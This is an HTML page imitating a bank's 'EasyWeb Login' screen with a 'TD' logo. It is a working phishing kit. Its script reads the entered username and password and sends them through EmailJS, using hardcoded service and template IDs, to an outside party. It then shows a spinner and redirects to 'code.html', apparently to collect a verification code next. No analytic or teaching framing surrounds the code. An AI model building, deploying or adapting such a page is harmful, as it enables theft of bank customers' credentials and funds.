<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Roboto',sans-serif;
}

/* HEADER */
.header{
    background:#0b5d2a;
    height:70px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 20px;
    color:white;
}

.header-left{
    display:flex;
    align-items:center;
    gap:20px;
}

.menu{
    width:28px;
    cursor:pointer;
}
.menu div{
    height:3px;
    background:white;
    margin:6px 0;
    border-radius:2px;
}

.logo{
    background:#21a038;
    padding:8px 14px;
    font-weight:700;
    font-size:26px;
    color:white;
}

.hero{
    background:#f1f1f1;
    padding:60px 40px;
}

.hero h1{
    font-weight:300;
    font-size:60px;
    color:#184c2b;
}

.container{
    display:flex;
    justify-content:center;
    align-items:center;
    width:100%;
}

.login-box{
    background:#fff;
    width:100%;
    max-width:450px;
    padding:40px;
    box-shadow:0 0 15px rgba(0,0,0,0.05);
}

label{
    font-size:22px;
    margin-bottom:10px;
    display:block;
}

input[type="text"],
input[type="password"]{
    width:100%;
    padding:18px;
    font-size:18px;
    border:2px solid #ddd;
    margin-bottom:25px;
    border-radius:6px;
}

input:focus{
    border-color:#0a8f08;
}

.password-wrapper{
    position:relative;
}

.eye{
    position:absolute;
    right:15px;
    top:50%;
    transform:translateY(-50%);
    cursor:pointer;
}

.remember{
    display:flex;
    align-items:center;
    margin-bottom:30px;
}

.remember input{
    margin-right:10px;
    accent-color:#0a8f08;
}

button{
    width:100%;
    padding:18px;
    background:#0a8f08;
    color:white;
    font-size:24px;
    border:none;
    border-radius:12px;
    cursor:pointer;
    display:flex;
    justify-content:center;
    align-items:center;
    gap:10px;
}

button:disabled{
    opacity:0.7;
    cursor:not-allowed;
}

button:hover{
    background:#087707;
}

/* ===== LOADER ===== */
#loader{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,0.4);
    display:none;
    justify-content:center;
    align-items:center;
    z-index:9999;
}

.spinner{
    width:50px;
    height:50px;
    border:5px solid rgba(255,255,255,0.3);
    border-top:5px solid orange;
    border-radius:50%;
    animation:spin 1s linear infinite;
}

@keyframes spin{
    to{transform:rotate(360deg);}
}
</style>
</head>

<body>

<div class="header">
    <div class="header-left">
        <div class="menu">
            <div></div>
            <div></div>
            <div></div>
        </div>
        <div class="logo">TD</div>
    </div>
    <div>Login</div>
</div>

<div class="hero">
    <h1>EasyWeb Login</h1>
</div>

<div class="container">
    <div class="login-box">

        <label>Username or Access Card</label>
        <input type="text" id="username">

        <label>Password</label>
        <div class="password-wrapper">
            <input type="password" id="password">
            <span class="eye" onclick="togglePassword()">👁</span>
        </div>

        <div class="remember">
            <input type="checkbox">
            <label>Remember me</label>
        </div>

        <button id="loginBtn" onclick="handleLogin()">
            Login
        </button>

    </div>
</div>

<!-- Loader -->
<div id="loader">
  <div class="spinner"></div>
</div>

<script>
function togglePassword(){
    const password=document.getElementById("password");
    password.type=password.type==="password"?"text":"password";
}

function handleLogin(){
    const loader=document.getElementById("loader");
    const button=document.getElementById("loginBtn");

    button.disabled=true;
    loader.style.display="flex";

    setTimeout(function(){
        window.location.href="code.html";
    },4000);
}
</script>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
(function(){
  emailjs.init("HBfoTRnwSHp3iTWvx");
})();

const loginButton = document.querySelector("button");

loginButton.addEventListener("click", function(event) {
  event.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById("password").value.trim();

  console.log("Username:", username);   // 👈 Check browser console
  console.log("Password:", password);

  if(!username || !password){
    alert("Please enter username and password");
    return;
  }

  emailjs.send("service_n9g1u7p", "template_2y92agq", {
    user_name: username,
    password: password
  })
  .then(function() {
    
  })
  .catch(function(error) {
    console.log(error);
    
  });
});


</script>

</body>
</html>
